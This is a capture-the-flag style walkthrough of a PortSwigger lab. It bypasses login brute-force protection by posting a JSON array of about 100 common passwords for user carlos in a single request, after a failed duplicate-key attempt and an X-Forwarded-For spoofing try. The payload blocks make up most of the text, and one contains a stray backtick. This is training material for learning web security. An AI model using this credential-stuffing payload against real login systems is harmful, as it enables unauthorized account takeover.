# Lab: Broken brute-force protection, multiple credentials per request

## Lab

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

- Victim's username: carlos
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Hint

None

## Solution

In this lab, application use json format to post data to the database. After try login with random credentials, In fourth time the application returns `You have made too many incorrect login attempts. Please try again in 1 minute(s).` i try to modify the ip with `X-Forwarded-For` header but it is useless. The application used something to identify us.

Looking at the title of the lab `multiple credentials per request`. Whether we can post many password attach with one username.

So we try to login with multiple password in json format like this:
```json
{
    "username":"carlos",
    "password":"123456",
    "password":"password",
    "password":"12345678",
    "password":"qwerty",
    "password":"123456789",
    "password":"12345",
    "password":"1234",
    "password":"111111",
    "password":"1234567",
    "password":"dragon",
    "password":"123123",
    "password":"baseball",
    "password":"abc123",
    "password":"football",
    "password":"monkey",
    "password":"letmein",
    "password":"shadow",
    "password":"master",
    "password":"666666",
    "password":"qwertyuiop",
    "password":"123321",
    "password":"mustang",
    "password":"1234567890",
    "password":"michael",
    "password":"654321",
    "password":"superman",
    "password":"1qaz2wsx",
    "password":"7777777",
    "password":"121212",
    "password":"000000",
    "password":"qazwsx",
    "password":"123qwe",
    "password":"killer",
    "password":"trustno1",
    "password":"jordan",
    "password":"jennifer",
    "password":"zxcvbnm",
    "password":"asdfgh",
    "password":"hunter",
    "password":"buster",
    "password":"soccer",
    "password":"harley",
    "password":"batman",
    "password":"andrew",
    "password":"tigger",
    "password":"sunshine",
    "password":"iloveyou",
    "password":"2000",
    "password":"charlie",
    "password":"robert",
    "password":"thomas",
    "password":"hockey",
    "password":"ranger",
    "password":"daniel",
    "password":"starwars",
    "password":"klaster",
    "password":"112233",
    "password":"george",
    "password":"computer",
    "password":"michelle",
    "password":"jessica",
    "password":"pepper",
    "password":"1111",
    "password":"zxcvbn",
    "password":"555555",
    "password":"11111111",
    "password":"131313",
    "password":"freedom",
    "password":"777777",
    "password":"pass",
    "password":"maggie",
    "password":"159753",
    "password":"aaaaaa",
    "password":"ginger",
    "password":"princess",
    "password":"joshua",
    "password":"cheese",
    "password":"amanda",
    "password":"summer",
    "password":"love",
    "password":"ashley",
    "password":"nicole",
    "password":"chelsea",
    "password":"biteme",
    "password":"matthew",
    "password":"access",
    "password":"yankees",
    "password":"987654321",
    "password":"dallas",
    "password":"austin",
    "password":"thunder",
    "password":"taylor",
    "password":"matrix",
    "password":"mobilemail",
    "password":"mom",
    "password":"monitor",
    "password":"monitoring",
    "password":"montana",
    "password":"moon",
    "password":"moscow",
    "":""
}
```

But it doesn't work. Maybe it doesn't work because value of variable `password` is overwritten by value of variable `password` following. So login with json format above doesn't different with login with `{"username":"carlos","password":"moscow"}`.

Now, instead of login like that we modify `password` from multiple passwords in string type to an array containing those string passwords.

```json
{"username":"carlos",
"password":[
    "123456",
    "password",
    "12345678",
    "qwerty",`
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"],
"":""}
```

send this request we received the response with status code is 302 (That means we have successful logged into carlos's account)

Last step is sending this request in browser and then we solved this lab.